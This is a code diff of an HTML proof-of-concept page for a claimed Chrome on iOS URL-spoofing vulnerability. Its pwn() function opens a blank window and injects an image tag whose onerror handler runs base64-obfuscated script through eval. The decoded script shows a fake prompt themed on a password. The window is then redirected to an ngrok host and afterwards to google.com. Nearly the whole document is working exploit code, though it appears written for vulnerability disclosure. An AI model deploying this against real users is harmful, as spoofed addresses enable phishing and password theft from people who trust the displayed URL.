@@ -3,11 +3,22 @@
         <title>Chrome URL spoofing vulnerability on IOS</title>
     </head>
     <script>
-        pwn = () => {
-            x = window.open("about:blank", "test");
-            x.document.write("<img src=@ onerror=eval(atob('c2V0VGltZW91dCgicHJvbXB0KCdmYWtlIGJhaWR1LmNvbSAsIERvbnQgZW50ZXIgcGFzc3dvcmQgeEQnKSIsMjAwMCk='))>");
-            setTimeout("x.location='https://8f12-203-83-40-75.ngrok-free.app/returns-204'", 1000);
-        }
+pwn = () => {
+    x = window.open("about:blank", "test");
+
+    x.document.write(
+        "<img src=@ onerror=eval(atob('c2V0VGltZW91dCgicHJvbXB0KCdmYWtlIGJhaWR1LmNvbSAsIERvbnQgZW50ZXIgcGFzc3dvcmQgeEQnKSIsMjAwMCk='))>"
+    );
+
+    setTimeout(() => {
+        x.location = "https://8f12-203-83-40-75.ngrok-free.app/returns-204";
+
+        setTimeout(() => {
+            x.location = "https://google.com";
+        }, 1000);
+
+    }, 1000);
+}
     </script>
     <a onclick="pwn()"><h1>Clickme</h1></a>
     </html>
